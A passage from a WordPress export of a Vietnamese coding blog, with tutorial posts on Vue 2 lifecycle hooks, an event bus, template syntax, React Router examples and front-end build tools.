                methods: {
                    destroyVue: function() {
                        this.$destroy();
                    }
                },
                beforeCreate: function() {
                    console.log("beforeCreate !");
                },
                created: function() {
                    console.log("created !");
                },
                beforeMount: function() {
                    console.log("beforeMount !");
                },
                mounted: function() {
                    console.log("mounted !");
                },
                beforeUpdate: function() {
                    console.log("beforeUpdate !");
                },
                updated: function() {
                    console.log("updated !");
                },
                beforeDestroy: function() {
                    console.log("beforeDestroy !");
                },
                destroyed: function() {
                    console.log("destroyed !");
                }
            });
        </script>
    </body>
</html>

</pre>

<h2>2. Lifecycle trong Component</h2>
-- Biến trong data chưa được khởi tạo khi ở hàm "beforeCreate"
-- Khi không có thẻ "keep-alive" -> mỗi lần switch component -> component cũ sẽ bị "destroyed"
-- Khi có thẻ "keep-alive" -> mỗi lần switch component -> component cũ sẽ bị "deactivated"
<pre>
<!DOCTYPE html>
<html lang="en">
    <body>
        <div id="app">
            <button @click="select_component = 'component_a'">
                Show Component A
            </button>
            <button @click="select_component = 'component_b'">
                Show Component B
            </button>
            <!-- <component :is="select_component"></component> -->
            <keep-alive>
                <component :is="select_component"></component>
            </keep-alive>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
        <script>
            //object chứa những key dùng chung ở các component khác nhau
            let component_mixins = {
                template: "<div><p>This is {{text}}</p></div>",

                beforeCreate: function() {
                    console.log(this.text + " - beforeCreate !");
                },
                created() {
                    console.log(this.text + " - created !");
                },
                beforeMount() {
                    console.log(this.text + " - beforeMount !");
                },
                mounted() {
                    console.log(this.text + " - mounted !");
                },
                beforeUpdate() {
                    console.log(this.text + " - beforeUpdate !");
                },
                updated() {
                    console.log(this.text + " - updated !");
                },
                beforeDestroy() {
                    console.log(this.text + " - beforeDestroy !");
                },
                destroyed() {
                    console.log(this.text + " - destroyed !");
                },
                activated() {
                    console.log(this.text + " - activated !");
                },
                deactivated() {
                    console.log(this.text + " - deactivated !");
                }
            };

            let component_a = {
                //sử dụng mixins để merge với component_mixins, tránh phải viết lại code
                mixins: [component_mixins],
                data: function() {
                    return {
                        text: "Component-A"
                    };
                },
            };
            let component_b = {
                //sử dụng mixins để merge với component_mixins, tránh phải viết lại code
                mixins: [component_mixins],
                data: function() {
                    return {
                        text: "Component-B"
                    };
                },
            };

            let app = new Vue({
                el: "#app",
                data: function() {
                    return {
                        select_component: "component_a"
                    };
                },
                components: {
                    component_a,
                    component_b
                }
            });
        </script>
    </body>
</html>
</pre>

<h2>3. Sơ đồ Lifecycle</h2>
<img src="https://vuejs.org/images/lifecycle.png" alt="lifecycle vue" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1133</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 01:00:33]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 18:00:33]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 01:00:33]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 18:00:33]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-lifecycle-vue-lifecycle-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS – Component: 3. Send Data giữa 2 component bất kỳ]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-component-3-send-data-giua-2-component-bat-ky/</link>
		<pubDate>Wed, 09 Jun 2021 22:00:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1175</guid>
		<description></description>
		<content:encoded><![CDATA[Khi 2 component cùng cha, có thể send data cho nhau bằng cách thông qua component cha
Tuy nhiên, với 2 component khác xa nhau. Có thể dùng 1 đối tượng Vue để tạo sự kiện qua nó

<h2>1. Tại file ./src/main.js</h2>
<pre>
import Vue from 'vue'
import App from './App.vue'

//Tạo 1 instance như 1 đối tượng vận chuyển data, cần gọi trước #app (ở dưới), 
export const eventBus = new Vue();

new Vue({
  el: '#app',
  render: h => h(App)
})
</pre>

<h2>2. Tại Component thứ 1 gửi data</h2>
<pre>
//Tạo button để bắt đầu sự kiện "sendOtherChild"
<template>
    <div>
        <input type="text" v-model="child_send" /><br />
        <button @click="sendOtherChild">Send To Other Children</button>
        <p>Child-1 Send: {{ child_send }}</p>
    </div>
</template>

<script>
//Lấy đối tượng "eventBus"
import { eventBus } from "../../main.js";

export default {
    //Giả sử data gửi đi là biến: "child_send"
    data: function() {
        return {
            child_send: "xyz"
        };
    },
    methods: {
        //Dùng "$emit" của "eventBus" để gửi sự kiện đi
        //"takeOtherChild": tên sự kiện
        //"this.child_send": data gửi đi
        sendOtherChild() {
            eventBus.$emit("takeOtherChild", this.child_send);
        }
    },
    
};
</script>
<style scoped></style>
</pre>

<h2>2. Tại Component thứ 2 nhận data</h2>
<pre>
<template>
    <div>
        <p>Other Child Receive: {{ other_child_reveive }}</p>
    </div>
</template>

<script>
//Lấy đối tượng "eventBus"
import { eventBus } from "../../main.js";

export default {
    //Giả sử data nhận về sẽ cập nhật vào biến "other_child_reveive";
    data: function() {
        return {
            other_child_reveive: "0"
        };
    },

    //Cần cho phép đối tượng eventBus được thực hiện lắng nghe sự kiện ngay khi Component khởi tạo
    //Nếu để vào methods chẳng hạn, thì phải đợi methods run rồi mới bắt đầu lắng nghe
    //Như vậy trước khi methods run, nếu có sự kiện xảy ra rồi thì sẽ không lắng nghe được
    //Vì vậy cần để ở "created" luôn
    created() {
        eventBus.$on("takeOtherChild", data => {
            this.other_child_reveive = data;
        });
    }
};
</script>
<style scoped></style>

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1175</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 05:00:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 22:00:35]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 05:00:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 22:00:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-component-3-send-data-giua-2-component-bat-ky]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS – Syntax]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-syntax/</link>
		<pubDate>Wed, 09 Jun 2021 19:00:38 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1187</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>I. Component</h1>
<h2>1. Template: </h2>
<pre>
//1. Get dữ liệu, có thể dùng funtion đơn giản
{{demo_var}}
{{demo_var == 1 ? currentScore : 0 }}

//2. Set attribute
v-bind:id
v-bind:class
:class="{class1: true, class2: false}"
v-bind:style="{backgroundColor: color_red, width: '100px'}"
v-bind:style="[customStyles, {width: '100px'}]"

//3. Two way biding, v-model.lazy: đợi viết xong input mới đổ dữ liệu
v-model = "demo_var"
v-model.lazy = "demo_var"

//4.1. Conditions 
v-if="true"
v-else-if="demo_var=== 'B'"
v-else

//4.2. Detach với v-show -> có thay đổi atribute
v-show="true"
v-hide="true"

//5. Render list
<li v-for="n in 10">{{n}}</li> //hiện từ 1 đến 10
<li v-for="item in demo_array">{{item}}</li>
<li v-for="(item, index) in demo_array" :key="item">{{index}} : {{item}}</li>
<li v-for="(value, key) in demo_object">{{key}} : {{value}}</li>
<li v-for="(value, key, index) in demo_object">{{index}} - {{key}} : {{value}}</li>

//6.1. Set event: event có thể là 1 biến, 1 function hoặc 1 event
@click = "demo_var= !demo_var"
v-on:click = "demo_funtion"
<input v-on:input="$emit('handleChangeFinalScore', $event)" type="text">

//6.2. Event modifiers: sử dụng đơn giản cho event.preventDefault(), event.stopPropagation()
<a v-on:click.stop="doThis"></a>
<form v-on:submit.prevent="onSubmit"></form>

//6.3. Key event modifiers: sử dụng keycode
<input v-on:keyup.enter="submit">
<input v-on:keyup.13="submit">
<input v-on:keyup.alt.67="clear">  //Alt + C
 
//6.4. Event native: với những element được append sau khi DOM khởi tạo, event thông thường sẽ không nhận được
//Vì vậy, cần dùng "event.native"
<item-component v-for="(item,index) in items" :key="index" @click.native="itemAction(index)"></item-component>


//7. Ref -> Sử dụng bằng cách: this.$refs.demoRef --> đã query được element
<div ref="demoRef"></div

//8.1. Slot trong component, ví dụ component <appCard>
    <slot></slot> //slot mặc định -> các slot không có name được ném vào đây
    <slot name="demo">Demo Text</slot> //slot với giá trị có sẵn
    <slot v-for="n in 10" :name="'slot' + n"></slot> //slot có name

//8.2. Slot ở parent
<appCard>
    <p>Thẻ này không có name, được ném vào slot mặc định</p>
    <p name="demo">Thẻ này có name, được ném vào slot có name là 'demo'</p>
    <p v-for="n in 10" :slot="'slot'+n">Number: {{ n }}</p>
</appCard>

//9. <template> : dùng được v-if,v-for, nhưng không dùng được v-show (vì có tạo attribute style)
<template v-if="true">
    <p>Hello world</p>
</template>


//10.1. <component>: 2 cách viết giống nhau, do trình tự biên dịch của Vue đổi chữ viết hoa thành viết thường và thêm dấu gạch ngang
<demoComponent></demoComponent>
<demo-component></demo-component>

//10.2. Kiểm tra component -> nếu var_name == "demoComponent" thì hiển thị Component có tên "demoComponent"
//Tuy nhiên nếu khi thay đổi var_name == "demoComponent2" thì Component có tên "demoComponent" sẽ bị destroy
<component :is="var_name"></component>

//10.2. Để tránh tình trạng destroy thì thêm thẻ <keep-alive>
<keep-alive>
    <component :is="var_name"></component>
</keep-alive>
</pre>

<em><strong>****. Những lưu ý về v-model</strong></em>
<pre>
//1. v-model trong input ==> bản chất là sự kết hợp của ":value" và "@input"
//2 câu lệnh ở dưới tương đương nhau
<input type="text" v-model="demo_var" />
<input type="text" :value = "demo_var" @input = "demo_var = $event.target.value" />

//2. v-model có hàm get và set, có thể thay đổi hàm đó bằng computed
//Lưu ý: Hàm set sẽ chạy trước hàm get
<input type="text" v-model="computed_customValue" />
<script>
    computed: {
        computed_customValue: {
            set(value) {
                //Khi gõ: "a" thì giá trị "customValue" là "ax", mọi nơi {{customValue }} đều show ra "ax"
                this.customValue = value + "x";
            }
            get() {
                //Khi gõ: "a" => sẽ hiển thị "axy", Lý do
                //Khi gõ: "a" => customValue = "ax" do được chạy "set()" ở hàm set phía trên
                //"ax"==> tiếp tục show ra "axy" do được chạy hàm "get()"
                return this.customValue+ "y";
            },
        }
    },
</script>
</pre>

<h2>2. Script</h2>
<pre>
let component_object = {
    el: '#app',

    //lấy data từ component cha
    props: {
        child_receive: {
            type: String,
            required: false,
            default: "Nothing !!!"
        },
    },

    data: {
        arrDemo: ['Samsung', 'Oppo', 'Vsmart', 'Xiaomi'],
        objDemo: {
            title: 'Project VueJS Demo',
            address: 'New York',
        },
        string_demo: "Hello world !!!",
    },

    //Luôn run lại khi render lại teamplate
    methods: {
        say: function (text) {
            return 'Hello ' + text;
        },
        senData: function () {
            this.$emit('handleNewGame', this.dataText);
        },
    },

    //Sử dụng như methods, nhưng chỉ các biến trong computed thay đổi thì computed mới chạy lại
    //Sử dụng như 1 property, không dùng ()
    computed: {
        say_computed: function (text) {
            return 'Hello ' + text;
        },
    },

    //Theo dõi sự thay đổi của 1 biến
    watch: {
        arrDemo: function (value) {
            return 'Ahihi' + value;
        },
    },

    //Dùng khi muốn thay đổi hiển thị trước khi ra view, nhưng không làm thay đổi giá trị thực sự
    //Sử dụng đơn giản tại template như sau: {{ message | filters}}
    filters: {
        formatVND: function (numbers) {
            return numbers.toFixed(3).replace(/\d(?=(\d{3})+\.)/g, '$&,');
        },
    },
};

</pre>

<h1>II. Webpack</h1>
-- Thay đổi đường dẫn gốc
<pre>
import XYZ from '../../src/components/Couter.vue'
//Thay bằng
import XYZ from '@src/components/Couter.vue'
</pre>
-- Vào ./webpack.config.js
<pre>

</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1187</wp:post_id>
		<wp:post_date><![CDATA[2021-06-10 02:00:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-09 19:00:38]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-10 02:00:38]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-09 19:00:38]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-syntax]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						</item>
					<item>
		<title><![CDATA[React-Router: 2. Custom Router]]></title>
		<link>https://duycode.com/2021/05/03/react-router-2-custom-router/</link>
		<pubDate>Sun, 02 May 2021 19:00:32 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1367</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Active Menu</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
    <style>
        .link-active {
            background-color: green;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js"></script>

    <script type="text/babel">
        const { HashRouter, Switch, Route, NavLink } = ReactRouterDOM

        const Home = () => <h1>Home</h1>
        const Product = () => <h1>Product</h1>
        const About = () => <h1>About</h1>
        const NotFound = () => <h1>NotFound</h1>

        const App = () => (
            <HashRouter>
                <div>
                    <NavLink exact to="/" activeStyle={{ color: 'white' }} activeClassName="link-active"> Home </NavLink>
                    <NavLink to="/product" activeStyle={{ color: 'white' }} activeClassName="link-active"> Product </NavLink>
                    <NavLink to="/about" activeStyle={{ color: 'white' }} activeClassName="link-active"> About </NavLink>
                    <NavLink to="/abcxyz" activeStyle={{ color: 'white' }} activeClassName="link-active"> abcxyz </NavLink>
                </div>
                <Switch>
                    <Route path="/" exact component={Home} />
                    <Route path="/product" component={Product} />
                    <Route path="/about" component={About} />
                    <Route component={NotFound} />
                </Switch>
            </HashRouter>
        );

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>

<h2>2. Custom Menu </h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
    <style>
        .link-active {
            background-color: green;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js"></script>


    <!-- =========== components/.........js =========== -->
    <script type="text/babel">
        const { HashRouter, Switch, Route, NavLink, Link } = ReactRouterDOM
        const Home = () => <h1>Home</h1>
        const Product = () => <h1>Product</h1>
        const About = () => <h1>About</h1>
        const NotFound = () => <h1>NotFound</h1>

        const App = () => {
            let CustomLink = ({ label, to, activeOnlyWhenExact }) => {
                let match = ReactRouterDOM.useRouteMatch({
                    path: to,
                    exact: activeOnlyWhenExact
                });

                return (
                    <li className={match ? "link-active" : ""}>
                        <Link to={to}>{label}</Link>
                    </li>
                );
            }

            return (
                <HashRouter>
                    <ul>
                        <CustomLink label="Home" to="/" activeOnlyWhenExact={true} />
                        <CustomLink label="Product" to="/product" />
                        <CustomLink label="About" to="/about" />
                        <CustomLink label="abcxyz" to="/abcxyz" />
                    </ul>
                    <Switch>
                        <Route path="/" exact component={Home} />
                        <Route path="/product" component={Product} />
                        <Route path="/about" component={About} />
                        <Route path="" component={NotFound} />
                    </Switch>
                </HashRouter>
            )
        }
        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1367</wp:post_id>
		<wp:post_date><![CDATA[2021-05-03 02:00:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-02 19:00:32]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 14:23:25]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 07:23:25]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[react-router-2-custom-router]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[React-Router: 3. Custom Component Props]]></title>
		<link>https://duycode.com/2021/05/03/react-router-3-custom-component-props/</link>
		<pubDate>Sun, 02 May 2021 20:00:20 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1373</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
    <style>
        .link-active {
            background-color: green;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js"></script>

    <script type="text/babel">
        const { HashRouter, Switch, Route, NavLink, Link } = ReactRouterDOM

        const Home = (props) => <p>{JSON.stringify(props, null, "\t")}</p>
        const Product = (props) => <p>{JSON.stringify(props, null, "\t")}</p>
        const Blog = (props) => <p>{JSON.stringify(props, null, "\t")}</p>
        const About = (props) => <p>{JSON.stringify(props, null, "\t")}</p>
        const NotFound = (props) => <h3>Not found</h3>
        const App = () => (
            <HashRouter>
                <div>
                    <Link to="/"> Home </Link>
                    <Link to="/Product"> Product </Link>
                    <Link to="/Blog"> Blog </Link>
                    <Link to="/About"> About </Link>
                    <Link to="/404"> 404 </Link>
                </div>
                <Switch>
                    <Route path="/" exact component={(routes) => <Home routes={routes} number={99}/>} />
                    <Route path="/Product" component={Product} />
                    <Route path="/Blog" component={({ match }) => <Blog match={match} />} />
                    <Route path="/About" component={() => <About />} />
                    <Route path="" component={NotFound} />
                </Switch>
            </HashRouter>
        );

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1373</wp:post_id>
		<wp:post_date><![CDATA[2021-05-03 03:00:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-02 20:00:20]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 14:32:46]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 07:32:46]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[react-router-3-custom-component-props]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[React-Router: 1. Basic Router]]></title>
		<link>https://duycode.com/2021/05/03/react-router-1-basic-router/</link>
		<pubDate>Sun, 02 May 2021 18:00:17 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1759</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. React v18 + ReactRouter v6</h2>
<pre>
<!DOCTYPE html>
<html lang='en'>

<head>
    <meta charset='UTF-8' />
    <meta http-equiv='X-UA-Compatible' content='IE=edge' />
    <meta name='viewport' content='width=device-width, initial-scale=1.0' />
    <title>ReactJS</title>
</head>

<body>
    <div id='root'></div>
    <script crossorigin src='https://unpkg.com/react@18/umd/react.development.js'></script>
    <script crossorigin src='https://unpkg.com/react-dom@18/umd/react-dom.development.js'></script>
    <script src='https://unpkg.com/babel-standalone@6/babel.min.js'></script>

    <!-- Load history -->
    <script src='https://unpkg.com/history@5/umd/history.development.js' crossorigin></script>
    <!-- Load React Router and React Router DOM -->
    <script src='https://unpkg.com/react-router@6/umd/react-router.development.js' crossorigin></script>
    <script src='https://unpkg.com/react-router-dom@6/umd/react-router-dom.development.js' crossorigin></script>

    <script type='text/babel'>
        const { useState, useEffect } = React
        const { HashRouter, Routes, Route, Link, Outlet, useParams, useNavigate } = ReactRouterDOM

        const Index = () => (
            <div>
                <Link to='/'>Home</Link> |{' '}
                <Link to='/products'>Products</Link> |{' '}
                <Link to='/about'>About</Link> |{' '}
                <Link to='/abcxyz'>404</Link>
                <hr />
                <Outlet />
            </div>
        )
        const Home = () => <h2>Home Page</h2>
        const ProductList = () => (
            <div>
                <Link to='new'>New</Link> |{' '}
                <Link to='1'>1</Link> |{' '}
                <Link to='not'>Not</Link>
                <Outlet />
            </div>
        )
        const ProductNew = () => <h2>Product New</h2>
        const ProductItem = () => {
            const params = useParams()
            const navigate = useNavigate()

            useEffect(() => {
                if (params.productId === 'not') navigate('../404')
            }, [params])
            return <h2>Product Item #{params.productId}</h2>
        }

        const About = () => <h2>About</h2>
        const NotFound = () => <h2>Not Found</h2>

        const App = () => (
            <HashRouter>
                <Routes>
                    <Route path='/' element={<Index />}>
                        <Route index element={<Home />} />
                        <Route path='/products' element={<ProductList />}>
                            <Route index element={<h2>Product List</h2>} />
                            <Route path='new' element={<ProductNew />} />
                            <Route path=':productId' element={<ProductItem />} />
                        </Route>
                        <Route path='/about' element={<About />} />
                        <Route path='*' element={<NotFound />} />
                    </Route>
                </Routes>
            </HashRouter>
        )

        const container = document.getElementById('root')
        ReactDOM.createRoot(container).render(<App />)
    </script>
</body>

</html>
</pre>

<h2>2. React v17 +  ReactRouter v5</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReactJS</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js"></script>

    <script type="text/babel">
        const { HashRouter, Link, Switch, Route } = ReactRouterDOM

        const Home = () => <h2>Home</h2>
        const Product = () => <h2>Product</h2>
        const About = () => <h2>About</h2>
        const NotFound = () => <h2>Not Found</h2>

        const App = () => (
            // khi sử dụng HashRouter, link url sẽ có dấu #, dạng index.html/#/router/..
            <HashRouter>
                <div>
                    <Link to="/"> Home </Link>
                    <Link to="/product"> Product </Link>
                    <Link to="/about"> About </Link>
                    <Link to="/abcxyz"> abcxyz </Link>
                </div>
                <Switch>
                    <Route path="/" exact component={Home} />
                    <Route path="/product" component={Product} />
                    <Route path="/about" component={About} />
                    <Route component={NotFound} />
                </Switch>
            </HashRouter>
        );

        ReactDOM.render(
            <App />,
            document.getElementById('root')
        );

    </script>
</body>

</html>
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1759</wp:post_id>
		<wp:post_date><![CDATA[2021-05-03 01:00:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-02 18:00:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-10 22:01:52]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-10 15:01:52]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[react-router-1-basic-router]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Các công cụ Front End]]></title>
		<link>https://duycode.com/2021/06/23/cac-cong-cu-front-end/</link>
		<pubDate>Wed, 23 Jun 2021 04:03:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1137</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://techmaster.vn/media/fileman/Uploads/users/188/1-L4TYDiuYB5-EK8SG2RjHHQ.png" alt="List tools front end" />
Node, NPM, Grunt, Gulp, Bower, Webpack, Browserify, Yeoman, Brunch... là nhiều công cụ front-end mà dường như chúng ta không thể theo kịp.

Các công cụ chia làm 2 loại: <strong>Install: Cài đặt thứ gì đó</strong> và <strong>Do: Làm gì đó</strong>
-- Install: npm, Bower, và Yeoman
-- Do: node, Grunt, Webpack, Require.js, Brunch và Gulp

* Các công cụ chính hiện nay thường sử dụng:
1. Công cụ quản lý: npm, trước đó thì có Bower
2. Công cụ đóng gói code: đóng gói nhiều module các file thành 1 file duy nhất
- mạnh nhất là webpack, trước đó là browserify
3. Công cụ biên dịch code: 
- Javascript biên dịch từ ES cao hơn như ES6 về ES5 để tương thích trình duyệt cũ: điển hình là Babel
- Biên dịch SASS sang CSS, v.v.v
4. Công cụ tạo bộ chạy tự động (như kiểu nodemon)
- Grunt và Gulp

* Ngày nay, các framework đã có thêm các công cụ để quá trình phát triển dễ dàng hơn
- Ember có ember-cli
- Angular có aungular-cli
- React có create-react-app
- Vue có vue-cli
--> các công cụ trên sẽ cài đặt sẵn các thư viện như: webpack, babel,... ---> rất rất ư là tiện
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1137</wp:post_id>
		<wp:post_date><![CDATA[2021-06-23 11:03:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-23 04:03:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-23 11:03:54]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-23 04:03:54]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cac-cong-cu-front-end]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mongodb"><![CDATA[MongoDB]]></category>
						</item>
					<item>
		<title><![CDATA[VueJS - Directives, Filters và Mixins]]></title>
		<link>https://duycode.com/2021/06/10/vuejs-directives-filters-va-mixins/</link>
		<pubDate>Thu, 10 Jun 2021 00:00:49 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1202</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Directives</h2>
